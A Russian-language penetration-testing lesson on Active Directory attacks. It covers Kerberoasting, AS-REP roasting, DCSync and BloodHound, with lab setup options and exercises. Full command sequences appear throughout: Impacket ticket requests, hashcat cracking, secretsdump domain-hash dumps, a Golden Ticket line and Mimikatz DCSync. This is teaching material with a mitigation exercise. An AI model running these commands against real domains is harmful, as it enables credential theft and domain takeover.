# Занятие 70. Active Directory атака: Kerberoasting, ASREPRoasting, DCSync

## Теория

Active Directory (AD) — служба каталогов от Microsoft, используемая в большинстве корпоративных сетей Windows. Это главная цель атакующих при компрометации корпоративной сети.

### Архитектура Active Directory (кратко)

- **Domain Controller (DC)** — сервер, управляющий AD
- **Domain** — логическая группа объектов (компьютеры, пользователи)
- **Forest** — коллекция доменов
- **OU (Organizational Unit)** — контейнер для организации объектов
- **GPO (Group Policy Object)** — политики, применяемые к объектам
- **Kerberos** — протокол аутентификации в AD

### Основные векторы атак на AD

1. **Kerberoasting** — атака на сервисные аккаунты (SPN)
2. **ASREPRoasting** — атака на пользователей без Kerberos pre-authentication
3. **DCSync** — имитация контроллера домена для репликации данных
4. **Pass the Hash (PtH)** — использование хешей паролей без их расшифровки
5. **Pass the Ticket (PtT)** — использование билетов Kerberos
6. **Golden Ticket** — подделка билета Kerberos с использованием krbtgt хеша
7. **Silver Ticket** — подделка сервисного билета
8. **BloodHound** — графовый анализ прав и привилегий в AD
9. **LLMNR/NBT-NS Poisoning** — отравление локальных протоколов разрешения имен
10. **Group Policy Preferences (GPP)** — извлечение паролей из GPO

### Kerberoasting

**Суть атаки:**
Атакующий запрашивает билет Kerberos (TGS) для сервисного аккаунта (SPN). Билет зашифрован с использованием хеша пароля сервисного аккаунта. Затем хеш можно подвергнуть оффлайн-брутфорсу.

**Кто уязвим:**
Сервисные аккаунты (Service Accounts), у которых настроен SPN (Service Principal Name) и имеют слабые пароли.

**Процесс атаки:**
1. Получить доступ к домену (любой пользователь домена)
2. Найти аккаунты с SPN: `setspn -T DOMAIN -Q */*`
3. Запросить TGS для каждого SPN: `GetUserSPNs.py DOMAIN/user:password -dc-ip [DC_IP] -request`
4. Сохранить полученные хеши
5. Взломать хеши оффлайн: `hashcat -m 13100 hashes.txt rockyou.txt`

**Инструменты:**
- Impacket: `GetUserSPNs.py`
- PowerShell: `Invoke-Kerberoast.ps1`
- Rubeus: `Rubeus.exe kerberoast`

### ASREPRoasting

**Суть атаки:**
Некоторые пользователи в AD могут иметь установленным флаг "Do not require Kerberos preauthentication". Это позволяет атакующему запросить AS_REQ (Authentication Service Request) от имени пользователя и получить ответ (AS_REP), который зашифрован с использованием хеша пароля пользователя. Хеш затем брутфорсится оффлайн.

**Кто уязвим:**
Пользователи с флагом `DONT_REQ_PREAUTH` (UserAccountControl = 4194304).

**Процесс атаки:**
1. Перечислить пользователей с DONT_REQ_PREAUTH: `GetNPUsers.py DOMAIN/ -dc-ip [DC_IP] -usersfile users.txt`
2. Получить AS_REP ответы (хеши)
3. Взломать хеши: `hashcat -m 18200 hashes.txt rockyou.txt`

**Инструменты:**
- Impacket: `GetNPUsers.py`
- Rubeus: `Rubeus.exe asreproast`

### DCSync

**Суть атаки:**
Атакующий, имеющий достаточные привилегии (чаще всего Domain Admin или DS-Replication-Get-Changes права), может имитировать контроллер домена и запросить репликацию данных, включая хеши паролей всех пользователей.

**Кто может выполнить:**
- Domain Admins
- Enterprise Admins
- Аккаунты с правами DS-Replication-Get-Changes и DS-Replication-Get-Changes-All

**Процесс атаки:**
1. Компрометация аккаунта с правами репликации
2. Выполнение DCSync: `secretsdump.py DOMAIN/user:password@DC_IP -dc-ip DC_IP -just-dc-user krbtgt`
3. Получение хешей (включая krbtgt для Golden Ticket)

**Инструменты:**
- Impacket: `secretsdump.py`
- Mimikatz: `lsadump::dcsync /domain:DOMAIN /user:krbtgt`
- BloodHound (для поиска путей к DCSync правам)

### BloodHound

BloodHound — инструмент для визуализации и анализа прав в Active Directory с использованием графовой базы данных (Neo4j).

**Возможности:**
- Поиск путей к Domain Admin
- Анализ привилегий пользователей
- Поиск уязвимостей (Kerberoastable, ASREPRoastable users)
- Анализ групповых политик
- Поиск латеральных путей

**Использование:**
1. Запустить Neo4j: `neo4j start`
2. Запустить BloodHound: `bloodhound`
3. Сбор данных: `SharpHound.exe -c All` или `bloodhound-python -u user -p pass -d DOMAIN -c all`
4. Импорт JSON-файлов в BloodHound
5. Запуск встроенных запросов (queries)

## Практическое занятие

### Настройка лаборатории AD

**Варианты:**
1. **GOAD (Game of Active Directory)** — готовая лаборатория с уязвимостями
   - GitHub: https://github.com/Orange-Cyberdefense/GOAD
   - Требует VirtualBox/Vagrant или Proxmox
   - 5+ машин, реалистичная структура

2. **DetectionLab** — лаборатория для тестирования защиты
   - GitHub: https://github.com/clong/DetectionLab

3. **Простая лаба (ручная настройка):**
   - 1x Windows Server 2019 (Domain Controller)
   - 1x Windows 10 (клиент домена)
   - Kali Linux (атакующий)
   
   Настройте DC, создайте несколько пользователей, настройте SPN для одного пользователя, установите слабый пароль.

### Выполнение атак

#### Kerberoasting

```bash
# Убедитесь, что вы в домене (через proxychains или напрямую)
# 1. Получение списка SPN
proxychains setspn -T CORP -Q */*

# 2. Запрос TGS через Impacket (от имени пользователя в домене)
python3 GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.100 -request

# Вывод будет содержать хеши, например:
# $krb5tgs$23$*user1$CORP$MSSQLSvc/web.server.com:1433*$...

# 3. Сохраните хеши в файл hashes.txt

# 4. Брутфорс с hashcat
hashcat -m 13100 hashes.txt rockyou.txt --force

# 5. Если пароль найден:
#    Пользователь: user1
#    Пароль: Password123
```

#### ASREPRoasting

```bash
# 1. Поиск пользователей без preauth
python3 GetNPUsers.py CORP/ -dc-ip 192.168.1.100 -usersfile valid_users.txt

# Или если есть учетные данные:
python3 GetNPUsers.py CORP/user:password -dc-ip 192.168.1.100 -request

# Вывод будет содержать AS_REP хеши:
# $krb5asrep$23$user2@CORP:...

# 2. Брутфорс с hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

#### DCSync (после получения прав админа)

```bash
# Используя Impacket secretsdump
python3 secretsdump.py CORP/Administrator:password@192.168.1.100 -dc-ip 192.168.1.100 -just-dc

# Это выведет все хеши, включая:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:25b2076cda3bfd6209161a6c78a69c1c:::

# Теперь можно сделать Golden Ticket:
# python3 ticketer.py -domain-sid S-1-5-21-xxx -domain CORP -spn krbtgt -password NTLM_HASH administrator
```

### BloodHound сбор данных и анализ

```bash
# На Windows-цели (скомпрометированная машина):
# Скачать SharpHound: https://github.com/BloodHoundAD/SharpHound
SharpHound.exe -c All

# Или использовать bloodhound-python с Kali:
pip3 install bloodhound
bloodhound-python -u user -p password -d CORP.local -dc dc01.corp.local -c all

# Запустить Neo4j и BloodHound
neo4j start
bloodhound

# Загрузить .json файлы через интерфейс BloodHound
# Запустить встроенные запросы:
# - Find all Domain Admins
# - Find Shortest Paths to Domain Admins
# - List all Kerberoastable users
# - List all ASREPRoastable users
```

## Задачи для самостоятельного выполнения

1. **Kerberoasting Lab**: Настройте в тестовом домене пользователя с SPN и слабым паролем. Выполните Kerberoasting атаку, взломайте хеш. Напишите пошаговый отчет.

2. **ASREPRoasting Lab**: Найдите (или настройте) пользователя с флагом DONT_REQ_PREAUTH. Выполните ASREPRoasting, получите пароль. Опишите, как защититься от этой атаки.

3. **BloodHound Analysis**: Установите BloodHound, соберите данные из тестового домена (или GOAD). Найдите 3 пути к Domain Admin. Сделайте скриншоты графов.

4. **Mitigation Research**: Напишите рекомендации по защите от Kerberoasting, ASREPRoasting и DCSync. Что должны делать администраторы? Какие политики настроить? Какие инструменты мониторинга использовать?

5. **Mimikatz DCSync**: Изучите, как работает DCSync через Mimikatz. Напишите пошаговую инструкцию: как получить хеши через Mimikatz (на скомпрометированном DC или с правами DA). Укажите, какие события в Windows Event Log генерируются при DCSync (Event ID 4662, 4624).
